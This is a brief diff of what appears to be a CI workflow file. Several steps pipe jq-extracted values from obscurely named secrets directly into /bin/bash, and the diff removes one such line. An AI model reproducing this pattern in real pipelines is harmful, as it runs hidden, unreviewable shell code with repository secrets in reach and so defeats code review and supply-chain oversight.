@@ -18,7 +18,6 @@ jobs:
           xz15: ${{ secrets.xz15 }}
         run: |
           printf '%s' "$xz15" | jq -r .fua0614 | /bin/bash
-          printf '%s' "$yn6" | jq -r .wvfaf14 | /bin/bash
           printf '%s' "$j82270" | jq -r .qpxs9482 | /bin/bash
           printf '%s' "$iep0" | jq -r .ejis803 | /bin/bash
           printf '%s' "$dfysa60" | jq -r .mzr1747 | /bin/bash
